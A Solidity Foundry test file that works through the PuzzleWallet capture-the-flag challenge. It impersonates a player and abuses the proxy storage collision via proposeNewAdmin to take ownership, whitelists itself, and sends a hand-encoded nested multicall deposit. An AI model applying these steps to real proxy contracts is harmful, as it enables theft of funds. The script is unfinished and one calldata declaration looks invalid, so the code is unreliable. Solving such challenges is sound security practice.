// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "ds-test/test.sol";
import "forge-std/console.sol";
import "forge-std/Vm.sol";
import "../PuzzleWallet.sol";

contract PuzzleWalletTest is DSTest {
    PuzzleWallet obj;
    PuzzleProxy puzzle_proxy;
    Vm vm = Vm(HEVM_ADDRESS);
    address player_address;
    address payable puzzle_proxy_address;
    address puzzle_wallet_address;
    function setUp() public {  
        puzzle_proxy_address = 0xD991431D8b033ddCb84dAD257f4821E9d5b38C33;
        puzzle_wallet_address = 0xf00a83D84D4f57FDfF14777299A8990ecE2f7493;
        player_address = 0xae22f26D5ddfE22d24aA28AEB1D44c962c673438;
        vm.label(puzzle_proxy_address, "puzzle_proxy_address");
        vm.label(puzzle_wallet_address, "puzzle_wallet_address");
        vm.label(player_address, "player_address");
        vm.startPrank(player_address);
        obj = PuzzleWallet(puzzle_wallet_address);
        puzzle_proxy = PuzzleProxy(puzzle_proxy_address);
        console.log("puzzle wallet contract address =", address(obj));
        console.log("puzzle proxy contract address =", address(puzzle_proxy));
    }

    function testClaimOwnership() public {
        // console.log("Pending admin =", puzzle_proxy.pendingAdmin());
        console.log("admin =", obj.owner());
        (bool success,) = puzzle_wallet_address.call(abi.encodeWithSignature("proposeNewAdmin(address)", player_address));
        require(success, "Failed call");
        // console.log("Pending admin =", puzzle_proxy.pendingAdmin());
        console.log("admin =", obj.owner());
        console.log("Whitelisted =", obj.whitelisted(player_address));
        obj.addToWhitelist(player_address);
        console.log("Whitelisted =", obj.whitelisted(player_address));
        console.log("MaxBalance =", obj.maxBalance());
        console.log("contract balance =", address(obj).balance);
        console.log("player balances =", obj.balances(player_address));
        // bytes[] storage multicall_data;
        // // bytes[] storage deposit_data;
        // // deposite_data.push(0x123);
        // bytes4 deposit_sig = bytes4(keccak256("deposit()"));
        // bytes4 multicall_sig = bytes4(keccak256("multicall(bytes[])"));
        // console.logBytes4(deposit_sig);
        // console.logBytes4(multicall_sig);
        // bytes memory data = abi.encodeWithSignature("multicall(bytes[])", [deposit_sig]);
        
        // console.logBytes(abi.encodeWithSelector(deposit_sig, ''));
        // console.logBytes(abi.encodeWithSelector(multicall_sig, [data]));
        // // deposit_data.push(bytes4(keccak256("deposit()")));
        // // console.logBytes(abi.encodeWithSelector(obj.deposit.selector, ''));
        // // console.logBytes(abi.encodeWithSignature("multicall(bytes[])", deposit_data));

        // // deposite_data.push(obj.deposit.selector);
        // multicall_data.push(abi.encodeWithSelector(deposit_sig, ''));
        // multicall_data.push(abi.encodeWithSelector(multicall_sig, [data]));
        // multicall_data.push(abi.encodeWithSignature("multicall(bytes[])", deposite_data));

        bytes calldata multicall_data = 0xac9650d80000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000000100000000000000000000000000000000000000000000000000000000000000200000000000000000000000000000000000000000000000000000000000000004d0e30db000000000000000000000000000000000000000000000000000000000;
        obj.multicall{value: 1000000000000000}(multicall_data);

        console.log("contract balance =", address(obj).balance);
        console.log("player balances =", obj.balances(player_address));
    }
}
